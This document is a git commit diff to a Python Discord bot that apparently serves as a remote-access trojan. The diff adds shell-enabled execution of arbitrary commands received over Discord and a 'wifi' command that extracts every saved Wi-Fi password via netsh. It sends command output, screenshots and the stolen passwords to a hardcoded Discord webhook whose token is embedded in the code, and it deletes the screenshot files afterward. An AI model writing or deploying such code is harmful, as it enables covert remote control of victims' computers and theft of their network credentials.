9b5dcda94fc699ba539221d03c7acdeaa0d0a723
BadPotato1007 <neeravgupta07@gmail.com>
2024-01-14 15:47:47 +0530

    tests

--- Server/bot.py
+++ Server/bot.py
@@ -4,6 +4,7 @@ import discord
 from discord_webhook import DiscordWebhook
 import pyautogui
 import datetime
+import time
 
 
 TOKEN = ""
@@ -27,20 +28,78 @@ async def on_message(message):
         await message.channel.send('Sent command!')
         command = message.content
         command = command.replace('command ', '')
-        hmm = subprocess.run(command, capture_output=True, text=True)
+        # os.system(command)
+        hmm = subprocess.run(command, capture_output=True, text=True, shell=True)
         webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content=hmm.stdout)
         response = webhook.execute()
-
-        print(hmm.stdout)
+        out = hmm.stdout
+        out = out.replace('Ã', '├')
+        out = out.replace('Ä', '─')
+        print(out)
+        
+        
+        
+        
+        
+        
     elif message.content.startswith('screenshot'):
         time_now = datetime.datetime.now()
-        await message.channel.send("Took a screenshot!")
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save("help.png")
         webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="Screenshot taken at " + str(time_now))
         with open("./help.png", "rb") as f:
             webhook.add_file(file=f.read(), filename="help.png")
         response = webhook.execute()
+        os.remove("./help.png")
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    elif message.content.startswith('wifi'):
+        networks, out = [], ''
+        wifis = []
+        try:
+            wifi = subprocess.check_output(
+                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
+                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
+            wifi = [i.split(":")[1][1:-1]
+                    for i in wifi if "All User Profile" in i]
+            wifis = len(networks)
+            for name in wifi:
+                try:
+                    results = subprocess.check_output(
+                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
+                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
+                    results = [b.split(":")[1][1:-1]
+                                for b in results if "Key Content" in b]
+                    
+                except subprocess.CalledProcessError:
+                    networks.append((name, ''))
+                    continue
+
+                try:
+                    networks.append((name, results[0]))
+                except IndexError:
+                    networks.append((name, ''))
+
+        except subprocess.CalledProcessError:
+            pass
+        except UnicodeDecodeError:
+            pass
+
+        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
+        out += f'{"-"*20}|{"-"*29}\n'
+        for name, password in networks:
+            out += '{:<20}| {:<}\n'.format(name, password)
+        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF", content="`"+ out + "`")
+        response = webhook.execute()
+
 
         
         
